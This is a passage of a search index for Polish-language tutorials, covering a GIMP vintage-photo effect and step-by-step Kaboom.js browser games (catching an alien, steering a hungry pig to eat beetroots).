barw\u0119.</p>"},{"location":"graphics/gimp/tutorials/vintage-effect/#dodajemy-winiete","title":"Dodajemy winiet\u0119","text":"<p>W grafice komputerowej winieta to efekt, w kt\u00f3rym obraz przechodzi stopniowo od \u015brodka w czarne t\u0142o na kraw\u0119dziach. Taki efekt idealnie pasuje do zdj\u0119cia w stylu retro.</p>"},{"location":"graphics/gimp/tutorials/vintage-effect/#1-tworzymy-nowa-warstwe","title":"1. Tworzymy now\u0105 warstw\u0119","text":"<p>Najpierw tworzymy now\u0105 warstw\u0119 z przezroczysto\u015bci\u0105. W tym celu wybieramy menu Warstwa-&gt;Nowa warstwa. Nazwijmy j\u0105 Winieta. Jako wype\u0142nienie wybieramy Przezroczysto\u015b\u0107. Gdy nowa warstwa zostanie ju\u017c utworzona, ustawiamy jej krycie na \\(50%\\).</p>"},{"location":"graphics/gimp/tutorials/vintage-effect/#2-tworzymy-zaznaczenie","title":"2. Tworzymy zaznaczenie","text":"<p>Maj\u0105c zaznaczon\u0105 now\u0105 warstw\u0119 tworzymy zaznaczenie w formie elipsy za pomoc\u0105 narz\u0119dzia Zaznaczenie eliptyczne. Nasza elipsa powinna by\u0107 wpisana w prostok\u0105t zdj\u0119cia.</p>"},{"location":"graphics/gimp/tutorials/vintage-effect/#3-zmiekczamy-zaznaczenie","title":"3. Zmi\u0119kczamy zaznaczenie","text":"<p>Wybieramy menu Zaznaczenie-&gt;Zmi\u0119kcz. Ustawiamy zmi\u0119kczenie na \\(150 px\\).</p>"},{"location":"graphics/gimp/tutorials/vintage-effect/#4-odwracamy-zaznaczenie","title":"4. Odwracamy zaznaczenie","text":"<p>Wybieramy menu Zaznaczenie-&gt;Odwr\u00f3\u0107.</p>"},{"location":"graphics/gimp/tutorials/vintage-effect/#5-wypeniamy-czarnym-kolorem","title":"5. Wype\u0142niamy czarnym kolorem","text":"<p>Na koniec wype\u0142niamy zaznaczenie czarnym kolorem za pomoc\u0105 narz\u0119dzia Wype\u0142nienie kube\u0142kiem.</p> <p>W ten spos\u00f3b uzyskujemy efekt winiety.</p>"},{"location":"graphics/gimp/tutorials/vintage-effect/#dodajemy-rozowawy-ton","title":"Dodajemy r\u00f3\u017cowawy ton","text":""},{"location":"graphics/gimp/tutorials/vintage-effect/#1-tworzymy-nowa-warstwe_1","title":"1. Tworzymy now\u0105 warstw\u0119","text":"<p>Dodajemy kolejn\u0105 warstw\u0119, tak jak poprzednio. Nazwijmy j\u0105 R\u00f3\u017c. Ustawiamy krycie nowej warstwy na \\(8%\\).</p>"},{"location":"graphics/gimp/tutorials/vintage-effect/#2-wypeniamy-warstwe-kolorem","title":"2. Wype\u0142niamy warstw\u0119 kolorem","text":"<p>Warning</p> <p>Przed przyst\u0105pieniem do tego kroku usuwamy wszystkie aktywne zaznaczenia: menu Zaznaczenie-&gt;Brak.</p> <p>W celu uzyskania po\u017c\u0105danego efektu u\u017cywamy narz\u0119dzia Wype\u0142nienie kube\u0142kiem i wype\u0142niamy now\u0105 warstw\u0119 \u017cywym kolorem r\u00f3\u017cowym, np #FF0090.</p>"},{"location":"graphics/gimp/tutorials/vintage-effect/#efekt-koncowy","title":"Efekt ko\u0144cowy","text":"<p>W ten spos\u00f3b dodali\u015bmy efekt retro do naszego zdj\u0119cia.  Zale\u017cnie od wybranych ustawie\u0144, nasze zdj\u0119cie mo\u017ce teraz wygl\u0105da\u0107 np. tak:</p> <p></p>"},{"location":"learning-by-games/","title":"Wst\u0119p","text":"<p>Wi\u0119kszo\u015b\u0107 kurs\u00f3w programistycznych ma podobn\u0105 struktur\u0119: uczymy si\u0119 podstaw j\u0119zyka, wykonuj\u0105c proste \u0107wiczenia, kt\u00f3re operuj\u0105 g\u0142\u00f3wnie na liczbach, tekstach i wypisuj\u0105 komunikaty do konsoli. Cz\u0119sto szczytem osi\u0105gni\u0119\u0107 na takich kursach jest stworzenie w\u0142asnej, uproszczonej wersji konsolowego kalkulatora czy innego podobnego programu. Ca\u0142a interakcja z naszym programem zazwyczaj sprowadza si\u0119 do wprowadzania danych w konsoli i obserwowania wypisywanych tekstowych komunikat\u00f3w. Jak raz powiedzia\u0142a jedna z moich uczennic: </p> <p>\"Kiedy pokazuj\u0119 mojej mamie, jak dzia\u0142aj\u0105 moje programy, nie robi to na niej wi\u0119kszego wra\u017cenia. Ot, jaki\u015b tekst pojawia si\u0119 na ekranie.\"</p> <p>I nic dziwnego! Jest to, kr\u00f3tko m\u00f3wi\u0105c, ma\u0142o efektowne, szczeg\u00f3lnie dla os\u00f3b, kt\u00f3re nie s\u0105 zaznajomione z programowaniem. A przecie\u017c, gdy uczymy si\u0119 czego\u015b nowego, cz\u0119sto chcemy pochwali\u0107 si\u0119 zdobytymi umiej\u0119tno\u015bciami przed rodzin\u0105 i znajomymi!</p> <p>To jest jeden z powod\u00f3w, dla kt\u00f3rych proponuj\u0119 alternatywne podej\u015bcie do nauki programowania - nauk\u0119 poprzez tworzenie gier i animacji.</p>"},{"location":"learning-by-games/#grafiki-i-dzwieki","title":"Grafiki i d\u017awi\u0119ki","text":"<p>Wszystkie grafiki, d\u017awi\u0119ki i czcionki u\u017cywane w projektach s\u0105 na licencji CC0 lub zbli\u017conych.</p> <p>Wi\u0119kszo\u015b\u0107 grafik i d\u017awi\u0119k\u00f3w pochodzi ze strony:</p> <p>https://kenney.nl/</p>"},{"location":"learning-by-games/#inne-zroda","title":"Inne \u017ar\u00f3d\u0142a","text":"<p>https://opengameart.org</p> <p>https://www.zapsplat.com/</p>"},{"location":"learning-by-games/javascript/","title":"JavaScript","text":""},{"location":"learning-by-games/javascript/kaboom/","title":"Gry z JavaScript - Kaboom","text":"<p>JavaScript nazywany jest cz\u0119sto \"j\u0119zykiem Internetu\". To j\u0119zyk programistyczny, kt\u00f3ry jest wykorzystywane na praktycznie ka\u017cdej stronie internetowej. Za jego pomoc\u0105 mo\u017cna tworzy\u0107 interaktywne narz\u0119dzia, animacje, a tak\u017ce gry. </p> <p>Istnieje wiele bibliotek pozwalaj\u0105cych na tworzenie gier w j\u0119zyku JavaScript, zar\u00f3wno 2D jak i 3D. My skorzystamy ze stosunkowo nowej i obiecuj\u0105cej biblioteki Kaboom, kt\u00f3ra wydaje si\u0119 by\u0107 idealna do rozpocz\u0119cia swojej przygody z programowaniem i tworzeniem gier.</p> <p>Czas zacz\u0105\u0107! Pozw\u00f3lcie \u017ce b\u0119d\u0119 Waszym przewodnikiem podczas podr\u00f3\u017cy po programowaniu i tworzeniu gier.</p>"},{"location":"learning-by-games/javascript/kaboom/#biblioteka","title":"Biblioteka","text":"<p>https://kaboomjs.com</p>"},{"location":"learning-by-games/javascript/kaboom/catch-alien/","title":"Z\u0142ap kosmit\u0119","text":""},{"location":"learning-by-games/javascript/kaboom/catch-alien/#pena-gra","title":"Pe\u0142na gra","text":"<pre><code>import kaboom from \"kaboom\";\n\nkaboom();\n\nloadSprite(\"alien\", \"sprites/alien.png\");\n\nlet score = 0;\n\nconst scoreText = add([\n  text(score),\n  pos(width() / 2, 40),\n  origin(\"center\"),\n]);\n\nconst alien = add([\n  sprite(\"alien\"),\n  pos(center()),\n  origin(\"center\"),\n  area(),\n]);\n\nalien.vx = 90;\nalien.vy = 100;\nalien.clicks(onClickAlien);\n\naction(update);\n\nfunction update() {\n  alien.move(alien.vx, alien.vy);\n\n  if (alien.pos.x &gt; width() - alien.width / 2 || alien.pos.x &lt; alien.width / 2) {\n    alien.vx *= -1\n  }\n\n  if (alien.pos.y &gt; height() - alien.height / 2 || alien.pos.y &lt; 0) {\n    alien.vy *= -1;\n  }\n\n  alien.vx += rand(-5, 5);\n  alien.vy += rand(-5, 5);\n\n  scoreText.text = score;\n}\n\nfunction onClickAlien() {\n  score++;\n  alien.pos.x = rand(alien.width / 2, width() - alien.width / 2);\n  alien.pos.y = rand(0, height() - alien.height / 2);\n  alien.vx = rand(80, 650);\n  alien.vy = rand(80, 650);\n\n  if (rand() &lt; 0.5) {\n    alien.vx *= -1;\n  }\n\n  if (rand() &lt; 0.5) {\n    alien.vy *= -1;\n  }\n}\n</code></pre> <p>https://replit.com/@damiankurpiewski/CatchAlien-1#code/main.js</p>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/","title":"G\u0142odna \u015bwinia","text":""},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#wstep","title":"Wst\u0119p","text":"<p>Stworzymy prost\u0105 gr\u0119, w kt\u00f3rej naszym graczem b\u0119dzie \u015bwinia. \u015awinie, jak wiadomo, lubi\u0105 je\u015b\u0107. Naszym celem b\u0119dzie wi\u0119c nakarmienie \u015bwini, a dok\u0142adniej: doprowadzenie jej do jedzenia. Na ekranie b\u0119d\u0105 si\u0119 pojawia\u0107 w losowych miejscach warzywa, a my b\u0119dziemy tak sterowa\u0107 \u015bwini\u0105, \u017ceby zjad\u0142a jak najwi\u0119cej. Po ka\u017cdym posi\u0142ku \u015bwinia b\u0119dzie przyspiesza\u0107, wi\u0119c gra b\u0119dzie stawa\u0142a si\u0119 coraz trudniejsza. Koniec gry nast\u0105pi, gdy \u015bwinia ucieknie poza ekran.</p>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<ul> <li>Jak sterowa\u0107 postaci\u0105 z klawiatury</li> <li>Jak wykrywa\u0107 kolizj\u0119 pomi\u0119dzy postaciami</li> <li>Jak obs\u0142u\u017cy\u0107 koniec gry i jej restart</li> </ul>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#materiay-do-pobrania","title":"Materia\u0142y do pobrania","text":""},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#grafiki","title":"Grafiki","text":"<p>Umieszczamy w katalogu images.</p> <p> Grafiki do gry G\u0142odna \u015awinia</p>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#dzwieki","title":"D\u017awi\u0119ki","text":"<p>Umieszczamy w katalogu sounds.</p> <p> D\u017awi\u0119ki do gry G\u0142odna \u015awinia</p>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#zroda","title":"\u0179r\u00f3d\u0142a","text":"<ul> <li>https://kenney.nl/</li> <li>https://comigo.itch.io/farm-puzzle-animals</li> <li>https://www.zapsplat.com/music/pig-squeal-close-up/</li> </ul>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#nasz-cel","title":"Nasz cel","text":"<p>G\u0142odna \u015bwinia</p>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#tworzymy-okno-gry","title":"Tworzymy okno gry","text":"<p>Zaczynamy od utworzenia okna gry i podstawowej konfiguracji projektu. Wymiary okna ustawimy na \\(800\\times800\\), poniewa\u017c tak mamy przygotowan\u0105 grafik\u0119 t\u0142a (bg.png). Wszystko umieszczamy w pliku index.html. </p> <pre><code>&lt;script type=\"module\"&gt;\n    import kaboom from \"https://unpkg.com/kaboom/dist/kaboom.mjs\";\n\n    kaboom({\n        width: 800,\n        height: 800,\n    });\n&lt;/script&gt;\n</code></pre>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#definiujemy-scene","title":"Definiujemy scen\u0119","text":"<p>Pocz\u0105tkowo stworzymy jedn\u0105 scen\u0119 o nazwie game, kt\u00f3ra b\u0119dzie g\u0142\u00f3wn\u0105 scen\u0105 naszej gry, tzn. scen\u0105, w kt\u00f3rej b\u0119dzie si\u0119 toczy\u0107 zasadnicza rozgrywka. Scen\u0119 tworzymy za pomoc\u0105 polecenia <code>scene</code>.</p> <pre><code>scene(\"game\", () =&gt; {\n\n});\n</code></pre> <p>Aby nasza gra zaczyna\u0142a si\u0119 od sceny game, na ko\u0144cu kodu dopisujemy instrukcj\u0119 <code>go(\"game\")</code>. Nasz kod powinien wygl\u0105da\u0107 teraz tak:</p> <pre><code>import kaboom from \"https://unpkg.com/kaboom/dist/kaboom.mjs\";\n\nkaboom({\n    width: 800,\n    height: 800,\n});\n\nscene(\"game\", () =&gt; {\n\n});\n\ngo(\"game\");\n</code></pre>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#wyswietlamy-to","title":"Wy\u015bwietlamy t\u0142o","text":"<p>Aby doda\u0107 t\u0142o do naszej gry, najpierw musimy je za\u0142adowa\u0107 z pliku bg.png za pomoc\u0105 polecenia <code>loadSprite</code>. Polecenie wywo\u0142ujemy zaraz pod wywo\u0142aniem <code>kaboom</code>:</p> <pre><code>import kaboom from \"https://unpkg.com/kaboom/dist/kaboom.mjs\";\n\nkaboom({\n    width: 800,\n    height: 800,\n});\n\nloadSprite(\"bg\", \"images/bg.png\");\n\n...\n</code></pre> <p>T\u0142o wy\u015bwietlimy na ekranie dodaj\u0105c nowy element do naszej g\u0142\u00f3wnej sceny za pomoc\u0105 polece\u0144 <code>add</code> oraz <code>sprite</code>.</p> <pre><code>scene(\"game\", () =&gt; {\n    add([\n        sprite(\"bg\"),\n    ]);\n});\n</code></pre>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#peen-kod","title":"Pe\u0142en kod","text":"<pre><code>import kaboom from \"https://unpkg.com/kaboom/dist/kaboom.mjs\";\n\nkaboom({\n    width: 800,\n    height: 800,\n});\n\nloadSprite(\"bg\", \"images/bg.png\");\n\nscene(\"game\", () =&gt; {\n    add([\n        sprite(\"bg\"),\n    ]);\n});\n\ngo(\"game\");\n</code></pre>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#swinia","title":"\u015awinia","text":"<p>Zacznijmy od naszej g\u0142\u00f3wnej postaci: \u015bwini. </p>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#adujemy-grafiki","title":"\u0141adujemy grafiki","text":"<p>Jak przyjrzymy si\u0119 grafikom, to zobaczymy, \u017ce mamy kilka grafik reprezentuj\u0105cych \u015bwini\u0119 w zale\u017cno\u015bci od kierunku, w kt\u00f3rym jest obr\u00f3cona. Wykorzystamy to przy poruszaniu si\u0119 \u015bwini. Najpierw musimy za\u0142adowa\u0107 grafiki z plik\u00f3w. Nowe instrukcje dopiszemy zaraz pod instrukcj\u0105 \u0142aduj\u0105c\u0105 t\u0142o (<code>loadSprite(\"bg\", \"images/bg.png\")</code>). Warto tak\u017ce od razu za\u0142adowa\u0107 d\u017awi\u0119k \u015bwini z pliku pig.wav, za pomoc\u0105 polecenia <code>loadSound</code>.</p> <pre><code>loadSprite(\"pig_down\", \"images/pig_down.png\");\nloadSprite(\"pig_up\", \"images/pig_up.png\");\nloadSprite(\"pig_left\", \"images/pig_left.png\");\nloadSprite(\"pig_right\", \"images/pig_right.png\");\nloadSprite(\"pig_dead\", \"images/pig_dead.png\");\n\nloadSound(\"pig\", \"sounds/pig.wav\");\n</code></pre>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#dodajemy-aktora","title":"Dodajemy aktora","text":"<p>Na pocz\u0105tku skorzystamy z grafiki pig_down. Na g\u00f3rze naszej g\u0142\u00f3wnej sceny, zaraz pod poleceniem dodaj\u0105cym t\u0142o, tworzymy naszego nowego aktora, kt\u00f3rego zapiszemy w zmiennej  pig, za pomoc\u0105 polecenia <code>add</code>. Nasz\u0105 posta\u0107 umie\u015bcimy na pocz\u0105tku na \u015brodku ekranu, czyli pod wsp\u00f3\u0142rz\u0119dnymi \\((400, 400)\\), kt\u00f3re mo\u017cemy pobra\u0107 za pomoc\u0105 polecenia <code>center()</code>. Nasz\u0105 \u015bwini\u0119 b\u0119dziemy ustawia\u0107 wzgl\u0119dem jej \u015brodka, dlatego te\u017c skorzystamy z polecenia <code>origin</code>, jako parametr podaj\u0105c warto\u015b\u0107 \"center\". Poniewa\u017c b\u0119dziemy chcieli wykrywa\u0107 kolizj\u0119 \u015bwini z innymi elementami gry, dopiszemy do niej tak\u017ce polecenie <code>area()</code>. Dobr\u0105 praktyk\u0105 jest dodawanie pomocniczych nazw do naszych aktor\u00f3w, tzw. tag\u00f3w, tak wi\u0119c do naszej \u015bwini dodamy tag \"pig\".</p> <pre><code>const pig = add([\n    sprite(\"pig_down\"),\n    pos(center()),\n    origin(\"center\"),\n    area(),\n    \"pig\",\n]);\n</code></pre>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#sterowanie-swinia","title":"Sterowanie \u015bwini\u0105","text":"<p>Nasz\u0105 \u015bwini\u0105 b\u0119dziemy sterowa\u0107 za pomoc\u0105 klawiatury. Strza\u0142kami b\u0119dziemy wybiera\u0107 kierunek, w kt\u00f3rym \u015bwinia ma pod\u0105\u017ca\u0107. Nasza \u015bwinia b\u0119dzie jednak porusza\u0107 si\u0119 przez ca\u0142y czas, pod\u0105\u017caj\u0105c w ostatnio wybranym kierunku zgodnie ze swoj\u0105 pr\u0119dko\u015bci\u0105. Do tego b\u0119d\u0105 nam potrzebne nowe zmienne, kt\u00f3re dopiszemy do naszego aktora:  - pr\u0119dko\u015b\u0107 pozioma: vx, - pr\u0119dko\u015b\u0107 pionowa: vy, - og\u00f3lna pr\u0119dko\u015b\u0107: v.</p> <p>Og\u00f3lna pr\u0119dko\u015b\u0107 pos\u0142u\u017cy nam do wyznaczania, jak szybko \u015bwinia ma si\u0119 porusza\u0107 w wybranym kierunku. T\u0119 warto\u015b\u0107 b\u0119dziemy tak\u017ce zwi\u0119ksza\u0107 po ka\u017cdym zjedzonym warzywie.</p> <p>Dopisujemy wi\u0119c nowe parametry do naszej \u015bwini. Aby na pocz\u0105tku \u015bwinia sta\u0142a w miejscu, pr\u0119dko\u015b\u0107 poziom\u0105 i pionow\u0105 ustawimy na \\(0\\). Natomiast pr\u0119dko\u015b\u0107 og\u00f3ln\u0105 ustawimy na \\(3\\), co wydaje si\u0119 by\u0107 dobrym poziomem startowym dla naszej gry. Oczywi\u015bcie zach\u0119cam do eksperymentowania!</p> <p>Parametry dopiszemy zaraz pod poleceniem tworz\u0105cym nasz\u0105 \u015bwini\u0119.</p> <pre><code>pig.vx = 0;\npig.vy = 0;\npig.v = 3;\n</code></pre> <p>Teraz czas zastosowa\u0107 pr\u0119dko\u015b\u0107 do pozycji \u015bwini, tak aby mog\u0142a porusza\u0107 si\u0119 po ekranie. W tym celu zdefiniujemy funkcj\u0119 <code>onUpdate</code> w naszej g\u0142\u00f3wnej scenie game. Wewn\u0105trz zaktualizujemy pozycj\u0119 \u015bwini na ekranie poprzez dodanie pr\u0119dko\u015bci do wsp\u00f3\u0142rz\u0119dnych po\u0142o\u017cenia naszego aktora.</p> <pre><code>onUpdate(\"pig\", () =&gt; {\n    pig.pos.x += pig.vx;\n    pig.pos.y += pig.vy;\n});\n</code></pre> <p>Oczywi\u015bcie w tym momencie \u015bwinia nie b\u0119dzie si\u0119 jeszcze porusza\u0107, poniewa\u017c ustawili\u015bmy jej pr\u0119dko\u015bci na \\(0\\). Warto dla test\u00f3w tymczasowo zmieni\u0107 pr\u0119dko\u015bci vx i vy, a nast\u0119pnie uruchomi\u0107 gr\u0119 by sprawdzi\u0107, czy wszystko dzia\u0142a poprawnie.</p> <p>Teraz czas wreszcie doda\u0107 obs\u0142ug\u0119 sterowania. W tym celu b\u0119dziemy potrzebowali nowych funkcji, kt\u00f3re pozwol\u0105 nam reagowa\u0107 na zdarzenia wci\u015bni\u0119cia klawisza na klawiaturze: <code>onKeyPress</code>. Dopiszemy je na dole naszej sceny, pod funkcj\u0105 <code>onUpdate</code>. Wewn\u0105trz funkcji b\u0119dziemy reagowa\u0107 na klikni\u0119cia przycisk\u00f3w na klawiaturze. W zale\u017cno\u015bci od klikni\u0119tego przycisku, b\u0119dziemy wykonywa\u0107 inne operacje. Je\u017celi klikni\u0119ta zostanie np. strza\u0142ka w lewo, to ustawimy pr\u0119dko\u015b\u0107 poziom\u0105 vx \u015bwini na -v, wyzerujemy pr\u0119dko\u015b\u0107 pionow\u0105 i zmienimy grafik\u0119 na pig_left.</p> <pre><code>onKeyPress(\"left\", () =&gt; {\n    pig.vx = -pig.v;\n    pig.vy = 0;\n    pig.use(sprite(\"pig_left\"));\n});\n</code></pre> <p>Podobnie post\u0119pujemy z pozosta\u0142ymi kierunkami, odpowiednio zmieniaj\u0105c pr\u0119dko\u015bci \u015bwini i jej grafik\u0119.</p> <pre><code>onKeyPress(\"right\", () =&gt; {\n    pig.vx = pig.v;\n    pig.vy = 0;\n    pig.use(sprite(\"pig_right\"));\n});\n\nonKeyPress(\"up\", () =&gt; {\n    pig.vx = 0;\n    pig.vy = -pig.v;\n    pig.use(sprite(\"pig_up\"));\n});\n\nonKeyPress(\"down\", () =&gt; {\n    pig.vx = 0;\n    pig.vy = pig.v;\n    pig.use(sprite(\"pig_down\"));\n});\n</code></pre>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#peny-kod","title":"Pe\u0142ny kod","text":"<pre><code>import kaboom from \"https://unpkg.com/kaboom/dist/kaboom.mjs\";\n\nkaboom({\n    width: 800,\n    height: 800,\n});\n\nloadSprite(\"bg\", \"images/bg.png\");\nloadSprite(\"pig_down\", \"images/pig_down.png\");\nloadSprite(\"pig_up\", \"images/pig_up.png\");\nloadSprite(\"pig_left\", \"images/pig_left.png\");\nloadSprite(\"pig_right\", \"images/pig_right.png\");\nloadSprite(\"pig_dead\", \"images/pig_dead.png\");\n\nloadSound(\"pig\", \"sounds/pig.wav\");\n\nscene(\"game\", () =&gt; {\n    add([\n        sprite(\"bg\"),\n    ]);\n\n    const pig = add([\n        sprite(\"pig_down\"),\n        pos(center()),\n        origin(\"center\"),\n        area(),\n        \"pig\",\n    ]);\n\n    pig.vx = 0;\n    pig.vy = 0;\n    pig.v = 3;\n\n    onUpdate(\"pig\", () =&gt; {\n        pig.pos.x += pig.vx;\n        pig.pos.y += pig.vy;\n\n        if (pig.pos.x &lt; 0 || pig.pos.x &gt; width() || pig.pos.y &lt; 0 || pig.pos.y &gt; height()) {\n            go(\"game_over\", points);\n        }\n    });\n\n    onKeyPress(\"left\", () =&gt; {\n        pig.vx = -pig.v;\n        pig.vy = 0;\n        pig.use(sprite(\"pig_left\"));\n    });\n\n    onKeyPress(\"right\", () =&gt; {\n        pig.vx = pig.v;\n        pig.vy = 0;\n        pig.use(sprite(\"pig_right\"));\n    });\n\n    onKeyPress(\"up\", () =&gt; {\n        pig.vx = 0;\n        pig.vy = -pig.v;\n        pig.use(sprite(\"pig_up\"));\n    });\n\n    onKeyPress(\"down\", () =&gt; {\n        pig.vx = 0;\n        pig.vy = pig.v;\n        pig.use(sprite(\"pig_down\"));\n    });\n});\n\ngo(\"game\");\n</code></pre>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#buraki","title":"Buraki","text":"<p>Nasza \u015bwinia b\u0119dzie \u017cywi\u0107 si\u0119 burakami. Na ekranie zawsze b\u0119dzie dok\u0142adnie jeden burak. Gdy \u015bwinia zje buraka, ten pojawi si\u0119 ponownie w nowym, losowym miejscu na ekranie.</p>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#adujemy-grafike","title":"\u0141adujemy grafik\u0119","text":"<p>Nasz burak b\u0119dzie reprezentowany przez grafik\u0119 beetroot.png. Na pocz\u0105tku musimy za\u0142adowa\u0107 grafik\u0119 korzystaj\u0105c z polecenia <code>loadSprite</code>. Dopisujemy nowe polecenie na g\u00f3rze naszego programu, zaraz pod poleceniami \u0142aduj\u0105cymi grafiki \u015bwini.</p> <pre><code>...\nloadSprite(\"bg\", \"images/bg.png\");\nloadSprite(\"pig_down\", \"images/pig_down.png\");\nloadSprite(\"pig_up\", \"images/pig_up.png\");\nloadSprite(\"pig_left\", \"images/pig_left.png\");\nloadSprite(\"pig_right\", \"images/pig_right.png\");\nloadSprite(\"pig_dead\", \"images/pig_dead.png\");\nloadSprite(\"beet\", \"images/beetroot.png\");\n...\n</code></pre>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#dodajemy-aktora_1","title":"Dodajemy aktora","text":"<p>Naszego aktora zapiszemy w zmiennej <code>beet</code>. Utworzymy go w scenie game i pocz\u0105tkowo umie\u015bcimy w dowolnym miejscu na ekranie, np. pod wsp\u00f3\u0142rz\u0119dnymi \\((200, 200)\\). Podobnie jak przy \u015bwini, do buraka dopiszemy tak\u017ce polecenia <code>origin</code> oraz <code>area</code>, a tak\u017ce tag \"beet\".</p> <pre><code>const beet = add([\n    sprite(\"beet\"),\n    pos(200, 200),\n    origin(\"center\"),\n    area(),\n    \"beet\",\n]);\n</code></pre>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#zjadanie-burakow","title":"Zjadanie burak\u00f3w","text":"<p>Podczas poruszania si\u0119 po ekranie, gdy \u015bwinia wejdzie w kolizj\u0119 z burakiem, to go zje. Po zjedzeniu buraka \u015bwinia powinna przyspieszy\u0107, wyda\u0107 odpowiedni odg\u0142os, a sam burak powinien przemie\u015bci\u0107 si\u0119 w losowe miejsce na ekranie.</p> <p>W celu stwierdzenia, \u017ce \u015bwinia jest w kolizji z burakiem, skorzystamy z instrukcji onCollide:</p> <pre><code>pig.onCollide(\"beet\", () =&gt; {\n});\n</code></pre> <p>Wszystko b\u0119dziemy zapisywa\u0107 w naszej g\u0142\u00f3wnej scenie game, zaraz pod poleceniem dodaj\u0105cym buraka.</p> <p>Po wykryciu kolizji zacznijmy od przemieszczenia buraka w losowe miejsce. Osobno wylosujemy nowe warto\u015bci dla wsp\u00f3\u0142rz\u0119dnych \\(x\\) oraz \\(y\\). Aby jednak burak nie pojawi\u0142 si\u0119 na brzegu ekranu, warto zadba\u0107 o odpowiedni margines, np \\(50\\) pikseli. W celu wylosowania warto\u015bci skorzystamy z funkcji rand, do kt\u00f3rej, jako argumenty, przekazujemy przedzia\u0142, z jakiego chcemy wylosowa\u0107 warto\u015b\u0107.</p> <pre><code>beet.pos.x = rand(50, width() - 50);\nbeet.pos.y = rand(50, height() - 50);\n</code></pre> <p>Nast\u0119pnie zwi\u0119kszamy pr\u0119dko\u015b\u0107 \u015bwini. W tym celu modyfikujemy parametr v, dodaj\u0105c do niego jak\u0105\u015b niewielk\u0105 liczb\u0119, np. \\(0.8\\). Warto poeksperymentowa\u0107 z r\u00f3\u017cnymi warto\u015bciami by dobra\u0107 odpowiedni dla siebie poziom trudno\u015bci.</p> <pre><code>pig.v += 0.8;\n</code></pre> <p>Na koniec warto jeszcze doda\u0107 efekty d\u017awi\u0119kowe.</p> <pre><code>play(\"pig\");\n</code></pre> <p>Ca\u0142y kod obs\u0142uguj\u0105cy kolizj\u0119 z burakiem prezentuje si\u0119 nast\u0119puj\u0105co:</p> <pre><code>pig.onCollide(\"beet\", () =&gt; {\n    beet.pos.x = rand(50, width() - 50);\n    beet.pos.y = rand(50, height() - 50);\n    points += 1;\n    pointsLabel.text = points;\n    pig.v += 0.8;\n    play(\"pig\");\n});\n</code></pre> <p>Umieszczamy nasz\u0105 instrukcj\u0119 w scenie game.</p> <pre><code>scene(\"game\", () =&gt; {\n    add([\n        sprite(\"bg\"),\n    ]);\n\n    const pig = add([\n        sprite(\"pig_down\"),\n        pos(center()),\n        origin(\"center\"),\n        area(),\n        \"pig\",\n    ]);\n\n    pig.vx = 0;\n    pig.vy = 0;\n    pig.v = 3;\n\n    onUpdate(\"pig\", () =&gt; {\n        pig.pos.x += pig.vx;\n        pig.pos.y += pig.vy;\n\n        if (pig.pos.x &lt; 0 || pig.pos.x &gt; width() || pig.pos.y &lt; 0 || pig.pos.y &gt; height()) {\n            go(\"game_over\", points);\n        }\n    });\n\n    onKeyPress(\"left\", () =&gt; {\n        pig.vx = -pig.v;\n        pig.vy = 0;\n        pig.use(sprite(\"pig_left\"));\n    });\n\n    onKeyPress(\"right\", () =&gt; {\n        pig.vx = pig.v;\n        pig.vy = 0;\n        pig.use(sprite(\"pig_right\"));\n    });\n\n    onKeyPress(\"up\", () =&gt; {\n        pig.vx = 0;\n        pig.vy = -pig.v;\n        pig.use(sprite(\"pig_up\"));\n    });\n\n    onKeyPress(\"down\", () =&gt; {\n        pig.vx = 0;\n        pig.vy = pig.v;\n        pig.use(sprite(\"pig_down\"));\n    });\n\n    const beet = add([\n        sprite(\"beet\"),\n        pos(200, 200),\n        origin(\"center\"),\n        area(),\n        \"beet\",\n    ]);\n\n    pig.onCollide(\"beet\", () =&gt; {\n        beet.pos.x = rand(50, width() - 50);\n        beet.pos.y = rand(50, height() - 50);\n        pig.v += 0.8;\n        play(\"pig\");\n    });\n});\n</code></pre>"},{"location":"learning-by-games/javascript/kaboom/hungry-pig/#peny-kod_1","title":"Pe\u0142ny kod","text":"<pre><code>import kaboom from \"https://unpkg.com/kaboom/dist/kaboom.mjs\";\n\nkaboom({\n    width: 800,\n    height: 800,\n});\n\nloadSprite(\"bg\", \"images/bg.png\");\nloadSprite(\"pig_down\", \"images/pig_down.png\");\nloadSprite(\"pig_up\", \"images/pig_up.png\");\nloadSprite(\"pig_left\", \"images/pig_left.png\");\nloadSprite(\"pig_right\", \"images/pig_right.png\");\nloadSprite(\"pig_dead\", \"images/pig_dead.png\");\nloadSprite(\"beet\", \"images/beetroot.png\");\n\nloadSound(\"pig\", \"sounds/pig.wav\");\n\nscene(\"game\", () =&gt; {\n    add([\n        sprite(\"bg\"),\n    ]);\n\n    const pig = add([\n        sprite(\"pig_down\"),\n        pos(center()),\n        origin(\"center\"),\n        area(),\n        \"pig\",\n    ]);\n\n    pig.vx = 0;\n    pig.vy = 0;\n    pig.v = 3;\n\n    onUpdate(\"pig\", () =&gt; {\n        pig.pos.x += pig.vx;\n        pig.pos.y += pig.vy;\n\n        if (pig.pos.x &lt; 0 || pig.pos.x &gt; width() || pig.pos.y &lt; 0 || pig.pos.y &gt; height()) {\n            go(\"game_over\", points);\n        }\n    });\n\n    onKeyPress(\"left\", () =&gt; {\n        pig.vx = -pig.v;\n        pig.vy = 0;\n        pig.use(sprite(\"pig_left\"));\n    });\n\n    onKeyPress(\"right\", () =&gt; {\n        pig.vx = 